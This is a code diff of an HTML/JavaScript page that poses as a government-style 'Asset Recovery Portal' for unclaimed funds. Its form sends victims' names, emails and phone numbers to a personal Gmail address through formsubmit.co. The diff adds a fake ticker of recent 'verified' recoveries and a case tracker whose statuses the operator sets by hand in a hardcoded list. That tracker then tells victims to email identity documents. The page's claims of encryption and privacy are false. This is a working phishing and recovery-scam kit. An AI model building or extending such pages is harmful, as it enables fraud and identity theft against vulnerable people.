@@ -28,7 +28,7 @@
             background-color: var(--background);
             color: var(--text);
             line-height: 1.6;
-            padding: 10px;
+            padding: 0 0 20px 0;
         }
 
         .security-banner {
@@ -40,21 +40,70 @@
             font-weight: 600;
             letter-spacing: 0.5px;
             text-transform: uppercase;
-            border-radius: 6px;
-            margin-bottom: 15px;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
+        }
+
+        .ticker-wrap {
+            width: 100%;
+            background-color: #1e293b;
+            overflow: hidden;
+            border-bottom: 2px solid #334155;
+            padding: 6px 0;
+        }
+
+        .ticker {
+            display: inline-block;
+            white-space: nowrap;
+            padding-left: 100%;
+            animation: ticker-move 35s linear infinite;
+            color: #38bdf8;
+            font-size: 12px;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+        }
+
+        @keyframes ticker-move {
+            0% { transform: translate3d(0, 0, 0); }
+            100% { transform: translate3d(-100%, 0, 0); }
         }
 
         .container {
-            max-width: 480px;
-            margin: 0 auto;
+            max-width: 520px;
+            margin: 20px auto;
+            padding: 0 10px;
+        }
+
+        .portal-nav {
+            display: flex;
+            background-color: #e2e8f0;
+            padding: 4px;
+            border-radius: 8px;
+            margin-bottom: 15px;
+        }
+
+        .nav-btn {
+            flex: 1;
+            background: none;
+            border: none;
+            padding: 10px;
+            font-size: 13px;
+            font-weight: 600;
+            color: #475569;
+            cursor: pointer;
+            border-radius: 6px;
+            transition: all 0.2s ease;
+        }
+
+        .nav-btn.active {
+            background-color: white;
+            color: var(--primary);
+            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
         }
 
         .portal-card {
             background-color: var(--card-bg);
             border: 1px solid var(--border);
             border-radius: 12px;
-            padding: 20px;
+            padding: 24px;
             box-shadow: 0 4px 12px rgba(0, 0, 0, 0.03);
         }
 
@@ -65,17 +114,8 @@
             padding-bottom: 15px;
         }
 
-        .header-section h1 {
-            font-size: 20px;
-            color: var(--primary);
-            font-weight: 700;
-            margin-bottom: 6px;
-        }
-
-        .header-section p {
-            font-size: 13px;
-            color: #64748b;
-        }
+        .header-section h1 { font-size: 22px; color: var(--primary); font-weight: 700; }
+        .header-section p { font-size: 13px; color: #64748b; margin-top: 4px; }
 
         label {
             display: block;
@@ -107,30 +147,18 @@
             box-shadow: 0 0 0 3px rgba(0, 135, 90, 0.1);
         }
 
-        .input-error {
-            border-color: var(--error) !important;
-            background-color: #fff8f6;
-        }
+        .input-error { border-color: var(--error) !important; background-color: #fff8f6; }
+        .error-message { color: var(--error); font-size: 12px; font-weight: 500; margin-top: 4px; display: none; }
 
-        .error-message {
-            color: var(--error);
-            font-size: 12px;
-            font-weight: 500;
-            margin-top: 4px;
-            display: none;
-        }
-
-        .form-step {
-            display: none;
-        }
-
-        .form-step.active {
-            display: block;
-            animation: fadeIn 0.3s ease-in-out;
-        }
+        .view-panel { display: none; }
+        .view-panel.active { display: block; animation: fadeIn 0.3s ease-in-out; }
+        .form-step { display: none; }
+        .form-step.active { display: block; }
 
         .btn {
-            display: block;
+            display: flex;
+            align-items: center;
+            justify-content: center;
             width: 100%;
             padding: 14px;
             background-color: var(--primary);
@@ -141,11 +169,69 @@
             font-weight: 600;
             cursor: pointer;
             margin-top: 20px;
-            text-align: center;
+            transition: background-color 0.2s;
         }
 
-        .btn-submit {
-            background-color: var(--accent);
+        .btn-submit { background-color: var(--accent); }
+        .spinner { animation: spin 1s linear infinite; margin-right: 10px; display: none; }
+
+        /* TRACKING TERMINAL DIAGRAMS */
+        .pipeline-display {
+            background-color: #f8fafc;
+            border: 1px solid #e2e8f0;
+            border-radius: 8px;
+            padding: 16px;
+            margin-top: 20px;
+            display: none;
+        }
+
+        .pipe-step {
+            display: flex;
+            align-items: flex-start;
+            margin-bottom: 16px;
+            position: relative;
+        }
+
+        .pipe-step:not(:last-child)::after {
+            content: '';
+            position: absolute;
+            left: 11px;
+            top: 24px;
+            width: 2px;
+            height: 24px;
+            background-color: #cbd5e1;
+        }
+
+        .pipe-icon {
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            background-color: #cbd5e1;
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 11px;
+            font-weight: bold;
+            margin-right: 12px;
+            z-index: 2;
+        }
+
+        /* Active/Complete Engine Styles */
+        .pipe-step.completed .pipe-icon { background-color: var(--accent); }
+        .pipe-step.completed .pipe-icon::after { content: ''; }
+        .pipe-step.current .pipe-icon { background-color: #0284c7; box-shadow: 0 0 0 4px rgba(2, 132, 199, 0.2); }
+        
+        .pipe-info h4 { font-size: 14px; color: var(--primary); font-weight: 600; }
+        .pipe-info p { font-size: 12px; color: #64748b; }
+
+        .supplemental-box {
+            background-color: #fef7e0;
+            border: 1px solid #f59e0b;
+            border-radius: 8px;
+            padding: 14px;
+            margin-top: 15px;
+            font-size: 13px;
         }
 
         .trust-footer {
@@ -158,98 +244,174 @@
             border-radius: 8px;
         }
 
-        .badge-row {
-            display: flex;
-            justify-content: center;
-            gap: 15px;
-            margin-top: 8px;
-            font-weight: 600;
-            font-size: 11px;
-            color: #475569;
-        }
-
+        .badge-row { display: flex; justify-content: center; gap: 15px; margin-top: 8px; font-weight: 600; font-size: 11px; color: #475569; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         @keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }
     </style>
 </head>
 <body>
 
-<div class="container">
     <div class="security-banner">
-        🔒 SECURE 256-BIT ENCRYPTION PROTOCOL ACTIVE • TREASURY INTENT SYSTEM
+        🔒 SECURE 256-BIT ENCRYPTION PROTOCOL ACTIVE • EXECUTIVE LEDGER APP
     </div>
 
-    <div class="portal-card" id="portalCard">
-        <div class="header-section">
-            <h1>Asset Recovery Portal</h1>
-            <p>National Property & Unclaimed Capital Intake System</p>
+    <div class="ticker-wrap">
+        <div class="ticker">
+            • REGISTRY VERIFIED: $14,240 RECOVERED IN TEXAS LEDGER (4 MINS AGO) 
+            • REGISTRY VERIFIED: $5,810 RECOVERED IN FLORIDA CAPITAL LEDGER (18 MINS AGO) 
+            • REGISTRY VERIFIED: $110,400 PROBATE FILE ESCROW AUDIT ACTIVE (1 HOUR AGO) 
+            • REGISTRY VERIFIED: $34,900 LIQUIDATED CORPORATE ASSET UNLOCKED (2 HOURS AGO)
+        </div>
+    </div>
+
+    <div class="container">
+        
+        <div class="portal-nav">
+            <button class="nav-btn active" id="btnViewIntake" onclick="switchView('intake')">Secure Registration Form</button>
+            <button class="nav-btn" id="btnViewTrack" onclick="switchView('track')">Client Case Terminal</button>
         </div>
 
-        <form action="https://formsubmit.co/doroskiiwilliams@gmail.com" method="POST" id="portalForm">
+        <div class="portal-card">
             
-            <input type="hidden" name="_next" value="https://yourportal.github.io/success.html">
-            <input type="hidden" name="_subject" value="⚠️ NEW PRIORITY ASSET INTAKE LEAD">
-            <input type="hidden" name="_captcha" value="true">
-            <input type="text" name="_honey" style="display:none">
-
-            <div class="form-step active" id="step1">
-                <label for="propertyState">Select State / Region of Origin</label>
-                <select name="propertyState" id="propertyState">
-                    <option value="" disabled selected>Choose Region...</option>
-                    <option value="TX">Texas (TX Registry)</option>
-                    <option value="FL">Florida (FL Registry)</option>
-                    <option value="NY">New York (NY Registry)</option>
-                    <option value="CA">California (CA Registry)</option>
-                    <option value="Other">Other Region / International File</option>
-                </select>
-                <div class="error-message" id="stateError">⚠️ Please select your region of origin to query the registry.</div>
-
-                <label for="assetTier">Estimated Unclaimed Capital Range</label>
-                <select name="assetTier" id="assetTier">
-                    <option value="" disabled selected>Select Estimated Amount...</option>
-                    <option value="Tier1">Under $1,000</option>
-                    <option value="Tier2">$1,000 - $10,000</option>
-                    <option value="Tier3">$10,000 - $50,000</option>
-                    <option value="Tier4">$50,000+ (Immediate High Priority)</option>
-                </select>
-                <div class="error-message" id="tierError">⚠️ Selecting an estimated range is required to initialize verification.</div>
-
-                <button type="button" class="btn" onclick="goToStep2()">Verify Asset Records →</button>
-            </div>
-
-            <div class="form-step" id="step2">
-                <div style="background-color: #e6f4ea; color: #137333; padding: 10px; border-radius: 6px; font-size: 13px; font-weight: 500; text-align: center; margin-bottom: 15px;">
-                    ✓ Pre-Qualification Complete: Active matches flagged.
+            <div id="panelIntake" class="view-panel active">
+                <div class="header-section">
+                    <h1>Asset Recovery Portal</h1>
+                    <p>National Property & Unclaimed Capital Intake System</p>
                 </div>
 
-                <label for="fullName">Full Legal Name</label>
-                <input type="text" name="fullName" id="fullName" placeholder="As it appears on official ID" disabled>
-                <div class="error-message" id="nameError">⚠️ Full legal name is required to match state ledger data.</div>
+                <form action="https://formsubmit.co/doroskiiwilliams@gmail.com" method="POST" id="portalForm">
+                    <input type="hidden" name="_next" value="https://Treasury-Portal-Admin.github.io/"> 
+                    <input type="hidden" name="_subject" value="⚠️ NEW PRIORITY ASSET INTAKE LEAD">
+                    <input type="hidden" name="_captcha" value="true">
+                    <input type="text" name="_honey" style="display:none">
 
-                <label for="email">Secure Notification Email</label>
-                <input type="email" name="email" id="email" placeholder="For record file updates" disabled>
-                <div class="error-message" id="emailError">⚠️ Provide a valid email address to receive tracking file updates.</div>
+                    <div class="form-step active" id="step1">
+                        <label for="propertyState">Select State / Region of Origin</label>
+                        <select name="propertyState" id="propertyState">
+                            <option value="" disabled selected>Choose Region...</option>
+                            <option value="TX">Texas (TX Registry)</option>
+                            <option value="FL">Florida (FL Registry)</option>
+                            <option value="NY">New York (NY Registry)</option>
+                            <option value="CA">California (CA Registry)</option>
+                            <option value="Other">Other Region / International File</option>
+                        </select>
+                        <div class="error-message" id="stateError">⚠️ Please select your region of origin to query the registry.</div>
 
-                <label for="phone">Primary Contact Number</label>
-                <input type="tel" name="phone" id="phone" placeholder="123-456-7890" maxlength="12" disabled>
-                <div class="error-message" id="phoneError">⚠️ A primary standard phone contact is required.</div>
+                        <label for="assetTier">Estimated Unclaimed Capital Range</label>
+                        <select name="assetTier" id="assetTier">
+                            <option value="" disabled selected>Select Estimated Amount...</option>
+                            <option value="Tier1">Under $1,000</option>
+                            <option value="Tier2">$1,000 - $10,000</option>
+                            <option value="Tier3">$10,000 - $50,000</option>
+                            <option value="Tier4">$50,000+ (Immediate High Priority)</option>
+                        </select>
+                        <div class="error-message" id="tierError">⚠️ Selecting an estimated range is required to initialize verification.</div>
 
-                <button type="button" class="btn btn-submit" onclick="validateAndSubmit()">Submit Secure Request & Finalize</button>
+                        <button type="button" class="btn" onclick="goStep2()">Verify Asset Records →</button>
+                    </div>
+
+                    <div class="form-step" id="step2">
+                        <div style="background-color: #e6f4ea; color: #137333; padding: 10px; border-radius: 6px; font-size: 13px; font-weight: 500; text-align: center; margin-bottom: 15px;">
+                            ✓ Pre-Qualification Complete: Active matches flagged.
+                        </div>
+
+                        <label for="fullName">Full Legal Name</label>
+                        <input type="text" name="fullName" id="fullName" placeholder="As it appears on official ID" disabled>
+                        <div class="error-message" id="nameError">⚠️ Full legal name is required to match state ledger data.</div>
+
+                        <label for="email">Secure Notification Email</label>
+                        <input type="email" name="email" id="email" placeholder="For record file updates" disabled>
+                        <div class="error-message" id="emailError">⚠️ Provide a valid email address to receive tracking file updates.</div>
+
+                        <label for="phone">Primary Contact Number</label>
+                        <input type="tel" name="phone" id="phone" placeholder="123-456-7890" maxlength="12" disabled>
+                        <div class="error-message" id="phoneError">⚠️ A primary standard phone contact is required.</div>
+
+                        <button type="button" class="btn btn-submit" id="submitBtn" onclick="validateAndSubmit()">
+                            <svg class="spinner" id="btnSpinner" width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                <circle cx="12" cy="12" r="10" stroke="rgba(255,255,255,0.3)" stroke-width="3"/>
+                                <path d="M12 2C6.47715 2 2 6.47715 2 12C2 13.5997 2.37562 15.1116 3.04337 16.4525" stroke="white" stroke-width="3" stroke-linecap="round"/>
+                            </svg>
+                            <span id="btnText">Submit Secure Request & Finalize</span>
+                        </button>
+                    </div>
+                </form>
             </div>
-        </form>
 
-        <div class="trust-footer">
-            All transited data is encrypted. This verification portal strictly adheres to consumer privacy standards. No data is shared with unverified third parties.
-            <div class="badge-row">
-                <span>🛡️ SECURE ASSET DEPLOYMENT</span>
-                <span>⚙️ INTENT MATCHED</span>
+            <div id="panelTrack" class="view-panel">
+                <div class="header-section">
+                    <h1>Case Management Hub</h1>
+                    <p>Institutional Account Tracker & Auditing Console</p>
+                </div>
+
+                <div style="background-color: #f1f5f9; padding: 15px; border-radius: 8px; border: 1px solid #e2e8f0;">
+                    <label style="margin-top: 0;" for="lookupID">Input Authorized File Case ID or Phone Number</label>
+                    <input type="text" id="lookupID" placeholder="e.g. REC-777, REC-101 or phone number">
+                    <button type="button" class="btn" style="margin-top: 12px; background-color: #0284c7;" onclick="executeLedgerLookup()">Query Registry Pipeline</button>
+                </div>
+
+                <div class="pipeline-display" id="pipelineContainer">
+                    <h3 style="font-size: 15px; color: var(--primary); font-weight: 700; margin-bottom: 4px; border-bottom: 1px solid #e2e8f0; padding-bottom: 8px;">
+                        File Ref: <span id="displayRefNum" style="color: #0284c7;">-</span>
+                    </h3>
+                    <p style="font-size:12px; color:#475569; margin-bottom:15px; font-weight:500;">
+                        Authorized Claimant: <span id="displayClientName" style="color:var(--primary); font-weight:700;">-</span><br>
+                        Registry Jurisdiction: <span id="displayClientRegion">-</span>
+                    </p>
+
+                    <div id="pipelineStepsContainer">
+                        </div>
+
+                    <div class="supplemental-box" id="supplementalBox" style="display:none;">
+                        <p style="font-weight: 700; color: #b45309; margin-bottom: 4px;">⚠️ Supplemental Action Required</p>
+                        <p style="color: #78350f; font-size: 12px; margin-bottom: 8px;">To upgrade this case file status to Stage 3, please forward your identity matching files to your assigned specialist link.</p>
+                        <a href="mailto:your-email@domain.com?subject=Supplemental Documents Verification" style="display:inline-block; font-size:12px; font-weight:700; color:white; background-color:#b45309; text-decoration:none; padding: 6px 12px; border-radius:4px;">Transmit Secure Documentation</a>
+                    </div>
+                </div>
             </div>
+
+            <div class="trust-footer">
+                All transited data is encrypted. This verification portal strictly adheres to consumer privacy standards. No data is shared with unverified third parties.
+                <div class="badge-row">
+                    <span>🛡️ SECURE ASSET DEPLOYMENT</span>
+                    <span>⚙️ INTENT MATCHED</span>
+                </div>
+            </div>
+
         </div>
     </div>
-</div>
 
 <script>
-    // Navigation Step 1 to Step 2
-    function goToStep2() {
+    // ----------------------------------------------------
+    // PRIVATE DATABASE LEDGER: CHOOSE EXACTLY WHAT CLIENTS SEE HERE
+    // stage 1 = Intake, stage 2 = Audit, stage 3 = Packaging, stage 4 = Approved
+    // ----------------------------------------------------
+    const PRIVATE_REGISTRY_DATABASE = {
+        "REC-777": { name: "Johnathan Doe", stage: 2, region: "Texas (TX Registry)", amount: "$10,000" },
+        "REC-101": { name: "Alice Smith", stage: 4, region: "Florida (FL Registry)", amount: "$50,000+" },
+        "555-123-4567": { name: "Robert Johnson", stage: 1, region: "California (CA Registry)", amount: "$1,000" }
+    };
+
+    const STEP_DEFINITIONS = [
+        { title: "Registry File Intake Completed", desc: "Initial system filter matching executed successfully." },
+        { title: "Treasury Audit & Asset Matching", desc: "Verification specialist cross-referencing regional ledger indices." },
+        { title: "Legal Claim Packaging", desc: "Compiling owner certification portfolios for state recovery submission." },
+        { title: "Escrow Distribution Approved", desc: "Liquidation execution completed by Treasury oversight." }
+    ];
+
+    function switchView(viewName) {
+        document.querySelectorAll('.view-panel').forEach(p => p.classList.remove('active'));
+        document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
+        if(viewName === 'intake') {
+            document.getElementById('panelIntake').classList.add('active');
+            document.getElementById('btnViewIntake').classList.add('active');
+        } else {
+            document.getElementById('panelTrack').classList.add('active');
+            document.getElementById('btnViewTrack').classList.add('active');
+        }
+    }
+
+    function goStep2() {
         const stateSelect = document.getElementById('propertyState');
         const tierSelect = document.getElementById('assetTier');
         const stateError = document.getElementById('stateError');
@@ -271,7 +433,6 @@
         step2.querySelectorAll('input').forEach(i => i.removeAttribute('disabled'));
     }
 
-    // Validation and Final Form Submit
     function validateAndSubmit() {
         const name = document.getElementById('fullName');
         const email = document.getElementById('email');
@@ -286,11 +447,92 @@
         if(phone.value.length < 12) { phone.classList.add('input-error'); document.getElementById('phoneError').style.display = 'block'; error = true; }
         if(error) return;
 
-        // Triggers the standard HTML form submission loop natively
+        const btn = document.getElementById('submitBtn');
+        const spinner = document.getElementById('btnSpinner');
+        const text = document.getElementById('btnText');
+
+        btn.style.pointerEvents = 'none';
+        btn.style.backgroundColor = '#051626';
+        spinner.style.display = 'block';
+        text.innerText = 'Verifying Ledger Attachment...';
+
         document.getElementById('portalForm').submit();
     }
 
-    // Dynamic Mobile Phone Formatting Script
+    // CONTROLLED RECOVERY LEDGER INTERACTION ENGINE
+    function executeLedgerLookup() {
+        const queryInput = document.getElementById('lookupID').value.trim();
+        const container = document.getElementById('pipelineContainer');
+        const stepsContainer = document.getElementById('pipelineStepsContainer');
+        const displayRefNum = document.getElementById('displayRefNum');
+        const displayClientName = document.getElementById('displayClientName');
+        const displayClientRegion = document.getElementById('displayClientRegion');
+        const suppBox = document.getElementById('supplementalBox');
+
+        if(queryInput === "") {
+            alert("Please input an authorized tracking hash or target number.");
+            return;
+        }
+
+        stepsContainer.innerHTML = ""; // Clear visual chart
+        const matchedRecord = PRIVATE_REGISTRY_DATABASE[queryInput];
+
+        if(matchedRecord) {
+            // Found matched case inside manual database parameters
+            displayRefNum.innerText = queryInput.toUpperCase();
+            displayClientName.innerText = matchedRecord.name;
+            displayClientRegion.innerText = matchedRecord.region + " | Allocation Tier: " + matchedRecord.amount;
+
+            // Render matching visual progression tree rows
+            STEP_DEFINITIONS.forEach((step, idx) => {
+                const currentStepNum = idx + 1;
+                let stepClass = "";
+                let iconContent = currentStepNum;
+
+                if (currentStepNum < matchedRecord.stage) {
+                    stepClass = "completed";
+                    iconContent = "✓";
+                } else if (currentStepNum === matchedRecord.stage) {
+                    stepClass = "current";
+                }
+
+                const stepHTML = `
+                    <div class="pipe-step ${stepClass}">
+                        <div class="pipe-icon">${iconContent}</div>
+                        <div class="pipe-info">
+                            <h4>${step.title}</h4>
+                            <p>${step.desc}</p>
+                        </div>
+                    </div>
+                `;
+                stepsContainer.innerHTML += stepHTML;
+            });
+
+            // Show secure supplemental upload files instruction only if stage 2 is active
+            suppBox.style.display = (matchedRecord.stage === 2) ? 'block' : 'none';
+
+        } else {
+            // Fallback screen styling for unlisted lookup variants
+            displayRefNum.innerText = queryInput.toUpperCase();
+            displayClientName.innerText = "Pending Verification Profile";
+            displayClientRegion.innerText = "System Audit Mode Active";
+            
+            stepsContainer.innerHTML = `
+                <div class="pipe-step current">
+                    <div class="pipe-icon">!</div>
+                    <div class="pipe-info">
+                        <h4>Manual Agent Intake Review Pending</h4>
+                        <p>Your record matching file has been logged securely. An intake manager is actively analyzing the local ledger file. No automated records found yet.</p>
+                    </div>
+                </div>
+            `;
+            suppBox.style.display = 'none';
+        }
+
+        container.style.display = 'block';
+        container.style.animation = 'fadeIn 0.3s ease-in-out';
+    }
+
     document.getElementById('phone').addEventListener('input', function (e) {
         let x = e.target.value.replace(/\D/g, '').match(/(\d{0,3})(\d{0,3})(\d{0,4})/);
         e.target.value = !x[2] ? x[1] : x[1] + '-' + x[2] + (x[3] ? '-' + x[3] : '');
